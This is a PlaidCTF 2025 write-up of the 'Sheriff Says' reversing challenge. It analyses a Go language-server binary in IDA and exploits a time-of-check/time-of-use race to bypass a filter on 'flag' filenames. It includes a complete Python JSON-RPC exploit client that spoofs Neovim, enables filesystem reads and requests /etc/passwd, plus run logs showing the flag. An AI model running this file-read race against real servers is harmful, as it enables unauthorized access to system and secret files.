---
title: Sheriff Says
category: PlaidCTF-2025
chall_description: 
points: 156
solves: 34
tags: rev
date: 2025-04-05
comments: false
---

The Sheriff steps into the square, hand twitchin’ near his holster, eyes locked on your repo. He’s seen the warnings---and he don’t take kindly to 'em. Fire up your IDE, fix what’s broken, and make damn sure your code don’t flinch… 'cause justice don’t wait, and neither does he.

---

# Overview
The README.md says:
```
Use Neovim

`nvim -u ./init.lua <file.go>`
```
After launching the binary and opening a file with `nvim -u ./init.lua <file.go>`, the server outputs logs like:
```sh
Wild West LSP server listening on port 9999
Received method: initialize
Initializing LSP server...
Client verification - Name: Neovim, Version: 0.10.2, IsNeovim: true
Neovim client verified, proceeding with initialization
Received method: initialized
Received method: textDocument/didOpen
Received method: textDocument/didSave
Publishing 0 diagnostics for file:///home/h/Downloads/wow.go
Received method: textDocument/didChange
Skipping fix tracking - empty text
Received method: textDocument/didChange
Failed to parse old text: 1:1: expected 'package', found i (and 2 more errors)
Received method: textDocument/didChange
Failed to parse old text: 1:1: expected 'package', found ii (and 2 more errors)
[DEBUG] scheduleDiagnosticsUpdate for file:///home/h/Downloads/wow.go: version=3, isDirty=true, lastGood="\n", text="iiiiiii\n"
Publishing 0 diagnostics for file:///home/h/Downloads/wow.go
Received method: textDocument/didChange
Failed to parse old text: 1:1: expected 'package', found iiiiiii (and 2 more errors)
Received method: textDocument/didChange
Failed to parse old text: 1:1: expected 'package', found iiiiii (and 2 more errors)
Received method: textDocument/didChange
Skipping fix tracking - empty text
[DEBUG] scheduleDiagnosticsUpdate for file:///home/h/Downloads/wow.go: version=6, isDirty=true, lastGood="\n", text="\n"
Publishing 0 diagnostics for file:///home/h/Downloads/wow.go
```
It appears to be an LSP server, let's take a look at it.
# Initial Analysis
Once we open this in IDA, we are dropped into main, which contains network and mutex stuff. Browsing the main functions, we can see a `main__ptr_Server_Handle` function with a weird string: `security restriction: cannot access files with 'flag' in the name`. Scrolling up we see the string`Command: %s with %d arguments\n` which appears to be for the LSP server:
```c
      v187 = "Command: %s with %d arguments\n";
      v188 = 30LL;
      v190.array = (interface__0 *)v339;
      v190.len = 2LL;
      v190.cap = 2LL;
      fmt_Fprintf(v405, *(string_0 *)(&v188 - 1), v190, v189, optsd);
      (...)
	    v406.data = (void *)os_Stderr;
        v406.tab = (internal_abi_ITab *)&go_itab__ptr_os_File_comma_io_Writer;
        v194 = "First argument: %v\n";
        v188 = 19LL;
        v190.array = (interface__0 *)&a;
        v190.len = 1LL;
        v190.cap = 1LL;
        fmt_Fprintf(v406, *(string_0 *)(&v188 - 1), v190, (int)v192, *(error_0 *)opts);
		(...)
		  v199 = "Second argument: %v\n";
          v188 = 20LL;
          v190.array = (interface__0 *)&a;
          v190.len = 1LL;
          v190.cap = 1LL;
          fmt_Fprintf(v407, *(string_0 *)(&v188 - 1), v190, (int)v197, *(error_0 *)opts);
			v203 = "Third argument (line content): %v\n";
            v188 = 34LL;
            v190.array = (interface__0 *)&a;
            v190.len = 1LL;
            v190.cap = 1LL;
            fmt_Fprintf(v408, *(string_0 *)(&v188 - 1), v190, (int)v201, *(error_0 *)opts);
```
The decompilation breaks after this, so we have to look at the assembly:
```c
mov     rax, [rdx]
lea     rbx, aWildwestQuickd ; "wildwest.quickDraw"
mov     ecx, 12h
call    runtime_memequal
nop     word ptr [rax+rax+00h]
test    al, al
jz      loc_54C58E // control flow goes to the next mov (eventually) if equal
(...)
mov     cs:main_err.tab, 0 // keep in mind this is a global variable on a multi-threaded application 
(...)
mov     rax, [rsp+2A0h+s] ; s
xchg    ax, ax
call    main__ptr_Server_hasFixedWarning
test    al, al
jz      loc_54C515 // only execute if a warning has been fixed
(...)
test    r12b, r12b // v218 = !UseFileSystem;
jmp     short loc_54C359
loc_54C359:
jz      short readfile_flag_check
```
Essentially, we have to execute the LSP command "wildwest.quickDraw" on the server, before that we also have to fix a warning and set the UseFileSystem in the config. If we get pass all of this we are faced with the next check:
```c
nop     dword ptr [rax+rax+00h]
call    strings_ToLower
lea     rcx, aFlag_2    ; substr
mov     edi, 4          ; substr
call    internal_stringslite_Index
test    rax, rax
jl      readfile
```
This jumps to the read file function if the string "flag" is not in the first argument of `wildwest.quickDraw` command. If the string is in the file, it jumps to this piece of code:
```c
lea     rax, aSecurityRestri ; format
mov     ebx, 41h ; 'A'  ; format
xor     ecx, ecx        ; a
xor     edi, edi        ; a
mov     rsi, rdi        ; a
call    fmt_Errorf
mov     cs:main_err.tab, rax // globally set variable
cmp     dword ptr cs:runtime_writeBarrier.enabled, 0
jz      short loc_54C3BA
```
The interesting part is that, after the flag check fails, it executes:
```c
          for ( i = 0LL; i < 1000000000; i = v221 + 1 )
          {
            v221 = i;
            if ( i == 100000000
                    * ((__int64)(i + ((unsigned __int128)(i * (__int128)(__int64)0xABCC77118461CEFDLL) >> 64)) >> 26) )
            {
              v312 = i;
              *(_OWORD *)&a.array = v4;
              runtime_convT64(i, (void *)v224);
              a.array = (interface__0 *)&RTYPE_int;
              a.len = v280;
              v224 = os_Stderr;
              v281 = &go_itab__ptr_os_File_comma_io_Writer;
              v282 = "🤠 Just a moment, partner! %d\n";
              v220 = 32LL;
              v190.array = (interface__0 *)&a;
              v190.len = 1LL;
              v190.cap = 1LL;
              fmt_Fprintf(*(io_Writer_0 *)(&v224 - 1), *(string_0 *)(&v220 - 1), v190, v283, *(error_0 *)opts);
              v221 = v312;
            }
          }
```
This introduces an artificial delay (note this for later). Finally, it jumps to the piece of code that it would have if the "flag" string was *not* in the argument:
```c
if ( main_err.tab )
        {
          *(_OWORD *)&a.array = v4;
          v190.len = (int)main_err.data;
          a.array = (interface__0 *)main_err.tab->Type;
          a.len = (int)main_err.data;
          v416.str = (uint8 *)"🚫 Access denied: %v";
          v416.len = 22LL;
          p_a = &a;
          v275 = 1LL;
          v190.array = (interface__0 *)1;
          fmt_Sprintf(v416, *(_slice_interface__0 *)((char *)&v190 - 16), *(string_0 *)&v190.len);
          runtime_convTstring(v416, v276);
          v416.len = (int)ctxa;
          v277 = ctx_8;
          v384._type = (internal_abi_Type *)&RTYPE_string;
          v384.data = v416.str;
          github_com_sourcegraph_jsonrpc2__ptr_Conn_Reply(
            conn,
            *(context_Context_0 *)&v416.len,
            req->ID,
            v384,
            *(error_0 *)opts);
          return;
        }
```
Essentially, if flag is not in the first argument, main_err.tab is not set and this check passes. If the flag is in the first argument, this main_err.tab is set and this check fails (printing `Access denied`). If the check does not fail, it finally goes to this code:
```c
        main_readFileContent(v417, *(string_0 *)&v221, *(error_0 *)&v190.array);
        v311 = (unsigned int)(int)v305;
        v278 = &old;
        v188 = 1LL;
        strings_genSplit(v417, *(string_0 *)(&v188 - 1), 0LL, -1LL, v396);
        if ( v295 <= (__int64)v311 )
        {
          v448.tab = ctxa;
          v448.data = ctx_8;
          v385._type = (internal_abi_Type *)&RTYPE_string;
          v385.data = &off_5E3E88;
          github_com_sourcegraph_jsonrpc2__ptr_Conn_Reply(conn, v448, req->ID, v385, *(error_0 *)opts);
          return;
        }
```
To summarize: this reads a file under specific conditions given it does not contain the string flag. **But** these conditions are perfect for a time of check time of use (TOCTOU) vulnerability:
- Sets a global variable to indicate a failed check
- Able to accept multiple connections at once
- Large time delay, allowing us to overwrite a variable
 
# Crafting a Working File Read
Claude+flocto did this part, essentially you fix a file and upload your own config. That sets `UseFileSystem` to `True`.
 
```python
import json
import socket

class JsonRpcClient:
    def __init__(self, host='localhost', port=9999):
        self.host = host
        self.port = port
        self.socket = None
        self.request_id = 0

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        return self

    def send_request(self, method, params=None, response_expected=True):
        self.request_id += 1
        request = {
            "jsonrpc": "2.0",
            "id": self.request_id,
            "method": method,
        }
        if params is not None:
            request["params"] = params

        serialized = json.dumps(request)
        content_length = len(serialized)
        headers = f"Content-Length: {content_length}\r\n\r\n"
        
        self.socket.sendall(headers.encode() + serialized.encode())
        if not response_expected:
            return
        return self.read_response()

    def read_response(self):
        # Read headers
        headers = b""
        while b"\r\n\r\n" not in headers:
            headers += self.socket.recv(1)
        
        # Parse Content-Length
        header_text = headers.decode('ascii')
        content_length = int(header_text.split('Content-Length: ')[1].split('\r\n')[0])
        
        # Read message body
        content = b""
        while len(content) < content_length:
            chunk = self.socket.recv(content_length - len(content))
            if not chunk:
                break
            content += chunk
        
        return json.loads(content.decode('utf-8'))

    def initialize(self, root_uri=None, capabilities=None):
        params = {
            "processId": None,
            "clientInfo": {
                "name": "neovim", # pretend to be neovim
                "version": "1.0.0"
            },
            "capabilities": capabilities or {}
        }
        if root_uri:
            params["rootUri"] = root_uri

        return self.send_request("initialize", params)

    def close(self):
        if self.socket:
            self.socket.close()
            self.socket = None


bad_file = '''
// test.go
package main

import "fmt"

// func test() {
// 	wr_bronco_sheriff := 1
// 	return wri_bronco_sheriff
	// this is a comment
// }


func shexiff_says_12345ABCDE67890abcde12345ABCDE67890abcde12345ABCDE67890() {
	temp := 1
	return temp
	// test
}
'''

good_file = '''
// test.go
package main

import "fmt"

// func test() {
// 	wr_bronco_sheriff := 1
// 	return wri_bronco_sheriff
	// this is a comment
// }


func sheriff_says_12345ABCDE67890abcde12345ABCDE67890abcde12345ABCDE67890() {
	temp := 1
	return temp
	// test
}
'''
if __name__ == "__main__":
    client = JsonRpcClient().connect()
    try:
        response = client.initialize()
        print("Initialization response:", response)
        
        # src_file = open('test.go', 'r').read()
        response = client.send_request("textDocument/didOpen", {
            "textDocument": {
                "uri": "file:///test.go",
                "languageId": "go",
                "version": 1,
                "text": bad_file
            }
        }, response_expected=False)

        # update to good file
        response = client.send_request("textDocument/didChange", {
            "textDocument": {
                "uri": "file:///test.go",
                "version": 2
            },
            "contentChanges": [{
                "text": good_file
            }]
        }, response_expected=True)

        # struct main.Config __packed
        # {
        #     bool EnforcePrefix;
        #     struct string
        #         RequiredPrefix;
        #     int MinimumNameLength;
        #     bool UseFileSystem;
        # ?? ?? ?? ?? ?? ?? ??
        # };

        response = client.send_request("workspace/executeCommand", {
            "Command": "wildwest.loadNewConfig",
            "Arguments": [{
                "EnforcePrefix": True,
                "RequiredPrefix": "a",
                "MinimumNameLength": 1,
                "UseFileSystem": True,
            }]
        })
        print("ExecuteCommand response:", response)

        diagnostics = client.read_response()
        print("Diagnostics response:", diagnostics)
        
        diagnostics = client.read_response()
        print("Diagnostics response:", diagnostics)

        response = client.send_request("workspace/executeCommand", {
            "Command": "wildwest.quickDraw",
            # Filename, LineNumber, ?
            "Arguments": ["/etc/passwd", 0, "hello there"]
        })
        print("ExecuteCommand response:", response)
        print(client.read_response())

        # shutdown
        response = client.send_request("shutdown", None)
        print("Shutdown response:", response)
    finally:
        client.close()
```
 
I am skipping over some stuff here, but the code is self explanatory. 
 
# Exploitation
Exploitation was as easy as running two versions of the above code twice, once with a normal file (/etc/passwd works) and one with "flag". You run the one containing flag first, setting the error and triggering the delay, then you run the other file. File one (ran slightly after):
 
```sh
h@DESKTOP-TH1NKC3 ~/Downloads> python test.py
Host: 54.221.151.72
Port: 7003
Initialization response: {'id': 1, 'result': {'capabilities': {'textDocumentSync': 1, 'hoverProvider': True, 'renameProvider': True, 'completionProvider': {'resolveProvider': False, 'triggerCharacters': ['w', 'r', '_', 'f']}, 'executeCommandProvider': {'commands': ['wildwest.quickDraw']}}}, 'jsonrpc': '2.0'}
ExecuteCommand response: {'id': 4, 'result': '🤠 Loaded new config! Now prefix="a" minLen=1 enforce=true\n', 'jsonrpc': '2.0'}
Diagnostics response: {'jsonrpc': '2.0', 'method': 'textDocument/publishDiagnostics', 'params': {'uri': 'file:///test.go', 'diagnostics': [{'range': {'start': {'line': 12, 'character': 5}, 'end': {'line': 12, 'character': 73}}, 'severity': 2, 'message': "Wild West Warning: 'sheriff_says_12345ABCDE67890abcde12345ABCDE67890abcde12345ABCDE67890' should be renamed to 'asheriff_says_12345ABCDE67890abcde12345ABCDE67890abcde12345ABCDE67890_outlaw'.", 'source': 'WildWestCodeWrangler'}]}}
Diagnostics response: {'jsonrpc': '2.0', 'method': 'textDocument/publishDiagnostics', 'params': {'uri': 'file:///test.go', 'diagnostics': [{'range': {'start': {'line': 12, 'character': 5}, 'end': {'line': 12, 'character': 73}}, 'severity': 2, 'message': "Wild West Warning: 'sheriff_says_12345ABCDE67890abcde12345ABCDE67890abcde12345ABCDE67890' should be renamed to 'asheriff_says_12345ABCDE67890abcde12345ABCDE67890abcde12345ABCDE67890_outlaw'.", 'source': 'WildWestCodeWrangler'}]}}
ExecuteCommand response: {'jsonrpc': '2.0', 'method': 'window/showMessage', 'params': {'type': 3, 'message': "🤠 YEEHAW! That line's wilder than a buckin' bronco!\n\nYour line:\n> "}}
{'id': 5, 'result': "🤠 YEEHAW! That line's wilder than a buckin' bronco!\n\nYour line:\n> ", 'jsonrpc': '2.0'}

Shutdown response: {'id': 6, 'result': None, 'jsonrpc': '2.0'}
```
 
File two (ran slightly before but at the same time as the above file):
 
```sh
[h@DESKTOP-TH1NKC3:~/Downloads]$ python test2.py
Host: 54.221.151.72
Port: 7003
Initialization response: {'id': 1, 'result': {'capabilities': {'textDocumentSync': 1, 'hoverProvider': True, 'renameProvider': True, 'completionProvider': {'resolveProvider': False, 'triggerCharacters': ['w', 'r', '_', 'f']}, 'executeCommandProvider': {'commands': ['wildwest.quickDraw']}}}, 'jsonrpc': '2.0'}
ExecuteCommand response: {'id': 4, 'result': '🤠 Loaded new config! Now prefix="a" minLen=1 enforce=true\n', 'jsonrpc': '2.0'}
Diagnostics response: {'jsonrpc': '2.0', 'method': 'textDocument/publishDiagnostics', 'params': {'uri': 'file:///test.go', 'diagnostics': [{'range': {'start': {'line': 12, 'character': 5}, 'end': {'line': 12, 'character': 73}}, 'severity': 2, 'message': "Wild West Warning: 'sheriff_says_12345ABCDE67890abcde12345ABCDE67890abcde12345ABCDE67890' should be renamed to 'asheriff_says_12345ABCDE67890abcde12345ABCDE67890abcde12345ABCDE67890_outlaw'.", 'source': 'WildWestCodeWrangler'}]}}
Diagnostics response: {'jsonrpc': '2.0', 'method': 'textDocument/publishDiagnostics', 'params': {'uri': 'file:///test.go', 'diagnostics': [{'range': {'start': {'line': 12, 'character': 5}, 'end': {'line': 12, 'character': 73}}, 'severity': 2, 'message': "Wild West Warning: 'sheriff_says_12345ABCDE67890abcde12345ABCDE67890abcde12345ABCDE67890' should be renamed to 'asheriff_says_12345ABCDE67890abcde12345ABCDE67890abcde12345ABCDE67890_outlaw'.", 'source': 'WildWestCodeWrangler'}]}}
ExecuteCommand response: {'jsonrpc': '2.0', 'method': 'window/showMessage', 'params': {'type': 3, 'message': "🤠 Howdy partner! That's some mighty fine syntax you got there!\n\nYour line:\n> PCTF{sh3riFF_$4y$_y0uR_c0D3_1$_cL34N_dd323724983c}"}}
{'id': 5, 'result': "🤠 Howdy partner! That's some mighty fine syntax you got there!\n\nYour line:\n> PCTF{sh3riFF_$4y$_y0uR_c0D3_1$_cL34N_dd323724983c}", 'jsonrpc': '2.0'}
Shutdown response: {'id': 6, 'result': None, 'jsonrpc': '2.0'}
```
# Conclusion
This was a golang LSP server with a custom command allowing for file reading under certain conditions. In order to bypass the filter disallowing the reading of the flag file we exploit a race condition and get the flag: 

 PCTF{sh3riFF_$4y$_y0uR_c0D3_1$_cL34N_dd323724983c}
